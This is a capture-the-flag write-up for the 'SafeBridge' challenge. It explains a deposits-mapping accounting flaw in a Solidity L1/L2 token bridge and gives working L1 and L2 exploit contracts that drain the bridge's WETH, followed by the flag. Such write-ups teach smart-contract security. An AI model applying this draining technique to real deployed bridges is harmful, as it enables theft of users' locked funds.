# SafeBridge (17 solves) (224 points)

![](https://i.imgur.com/mlfmr1P.png)

The goal of this challenge is the drain the bridge in L1 :
```
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Challenge {
    address public immutable BRIDGE;
    address public immutable MESSENGER;
    address public immutable WETH;

    constructor(address bridge, address messenger, address weth) {
        BRIDGE = bridge;
        MESSENGER = messenger;
        WETH = weth;
    }

    function isSolved() external view returns (bool) {
        return IERC20(WETH).balanceOf(BRIDGE) == 0;
    }
}
```

It will first deposit 2 ether of WETH to the L1 bridge and bridge them to L2_WETH in the L2
```
    function deploy(address system) internal returns (address challenge) {
        vm.createSelectFork(vm.envString("L1_RPC"));
        vm.startBroadcast(system);
        address relayer = getAdditionalAddress(0);
        L1CrossDomainMessenger l1messenger = new L1CrossDomainMessenger(relayer);
        WETH weth = new WETH();
        L1ERC20Bridge l1Bridge =
            new L1ERC20Bridge(address(l1messenger), Lib_PredeployAddresses.L2_ERC20_BRIDGE, address(weth));

        weth.deposit{value: 2 ether}();
        weth.approve(address(l1Bridge), 2 ether);
        l1Bridge.depositERC20(address(weth), Lib_PredeployAddresses.L2_WETH, 2 ether);

        challenge = address(new Challenge(address(l1Bridge), address(l1messenger), address(weth)));
        vm.stopBroadcast();
    }
```

So there is 2 ether of WETH locked in the L1 bridge

Here is a simple graph showing how the bridge works (bridging tokens from L1 to L2) :

![](https://raw.githubusercontent.com/Kaiziron/real-world-ctf-6th-writeups/main/graph.png)

When the bridges are bridging to another side, it will call the CrossDomainMessenger, which emit events for the relayer to read and relay to another side

When we are bridging from L2 back to L1 :

```
    function _initiateWithdrawal(address _l2Token, address _from, address _to, uint256 _amount) internal {
        IL2StandardERC20(_l2Token).burn(msg.sender, _amount);

        address l1Token = IL2StandardERC20(_l2Token).l1Token();
        bytes memory message;
        if (_l2Token == Lib_PredeployAddresses.L2_WETH) {
            message = abi.encodeWithSelector(IL1ERC20Bridge.finalizeWethWithdrawal.selector, _from, _to, _amount);
        } else {
            message = abi.encodeWithSelector(
                IL1ERC20Bridge.finalizeERC20Withdrawal.selector, l1Token, _l2Token, _from, _to, _amount
            );
        }

        sendCrossDomainMessage(l1TokenBridge, message);

        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount);
    }
```

It just call the `_l2Token` to get the `l1Token` address, so we can just create and mint our own token and set `l1Token` to L1 WETH and bridge it to L1, the L2 withdrawal will not revert and the relayer will relay it back to L1

However, if we do that, it will underflow in the L1 bridge and revert, because it will subtract the amount from the deposits mapping, and by default the deposits mapping of L1 WETH and our own token will be 0 :

```
    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        public
        onlyFromCrossDomainAccount(l2TokenBridge)
    {
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;
        IERC20(_l1Token).safeTransfer(_to, _amount);
        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);
    }
```

But in the L1 bridge `_initiateERC20Deposit()`, it will set the deposits mapping wrongly : 

```
    function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
        internal
    {
        IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

        bytes memory message;
        if (_l1Token == weth) {
            message = abi.encodeWithSelector(
                IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
            );
        } else {
            message =
                abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
        }

        sendCrossDomainMessage(l2TokenBridge, message);
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

        emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
    }
```

If the `_l1Token` is L1 WETH, it will send the message with L2_WETH as the L2 token no matter what `_l2Token` we set, but it will increase the deposits mapping of L1 WETH and the `_l2Token` we set instead of L2 WETH

So we can just deposit 2 ether of L1 WETH and set `_l2Token` to our own token to increase the deposits mapping of L1 WETH and our own token to 2 ether

Although this will also increase the L1 WETH of L1 bridge, it doesn't matter because we will stll receive L2 WETH on the L2 as the `_l2Token` in the message it is sending to L2 is set to L2 WETH

So we can just withdraw those L2 WETH we received to get back 2 ether of L1 WETH from the L1 bridge, even our deposit did not increase the deposits mapping of L1 WETH and L2 WETH, it won't underflow because the mapping is already set to 2 ether initially in the deploy script when it bridge 2 ether of L1 WETH to L2 WETH

### Exploit (L1) :

```
pragma solidity ^0.8.20;

import "./Challenge.sol";
import "./L1/L1ERC20Bridge.sol";
import "./L1/WETH.sol";

contract Exploit {
    address public bridge;
    address public messenger;
    address public weth;
    address public exploitL2;
    Challenge public chall;

    constructor(address _challenge, address _exploitL2) {
        chall = Challenge(_challenge);
        bridge = chall.BRIDGE();
        messenger = chall.MESSENGER();
        weth = chall.WETH();
        exploitL2 = _exploitL2;
    }

    function exploit() public payable {
        require(msg.value == 2 ether, "msg.value != 2 ether");
        WETH(payable(weth)).deposit{value: 2 ether}();
        WETH(payable(weth)).approve(address(bridge), 2 ether);
        L1ERC20Bridge(bridge).depositERC20To(address(weth), exploitL2, exploitL2, 2 ether);
    }
}
```

### Exploit (L2) :

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Lib_PredeployAddresses} from "./libraries/constants/Lib_PredeployAddresses.sol";
import {L2StandardERC20} from "./L2/standards/L2StandardERC20.sol";
import "./L2/L2ERC20Bridge.sol";
import "./L2/standards/L2WETH.sol";

contract ExploitL2 is L2StandardERC20 {
    address public bridge = Lib_PredeployAddresses.L2_ERC20_BRIDGE;
    
    constructor() L2StandardERC20(address(0), "ExploitL2", "EXP2") {}

    function exploit(address L1_WETH) public {
        l1Token = L1_WETH;
        _mint(address(this), 2 ether);
        L2StandardERC20(address(this)).approve(bridge, type(uint256).max);
        L2ERC20Bridge(bridge).withdraw(address(this), 2 ether);

        L2WETH(Lib_PredeployAddresses.L2_WETH).approve(bridge, type(uint256).max);
        L2ERC20Bridge(bridge).withdraw(Lib_PredeployAddresses.L2_WETH, 2 ether);
    }
}
```

### Flag :

```
rwctf{yoU_draINED_BriD6E}
```